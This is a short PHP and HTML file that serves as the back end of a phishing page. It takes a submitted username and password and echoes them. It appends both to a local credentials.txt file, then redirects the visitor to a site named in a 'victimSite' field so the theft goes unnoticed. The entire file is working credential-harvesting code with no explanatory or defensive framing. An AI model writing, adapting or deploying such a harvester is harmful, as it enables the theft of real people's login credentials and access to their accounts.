<html>
<body>

Username: <?php echo $_POST["user"]; $file = fopen("credentials.txt","a"); echo fwrite($file,"\n" . "USERNAME: " . $_POST["user"] . "\n"); fclose($file); ?><br>
Password: <?php echo $_POST["passw"]; $file = fopen("credentials.txt","a"); echo fwrite($file,"PASSWORD: " . $_POST["passw"]. "\n"); fclose($file);?><br>

<?php

   header( 'Location: ' . $_POST["victimSite"] ) ;

?>

</body>
</html> 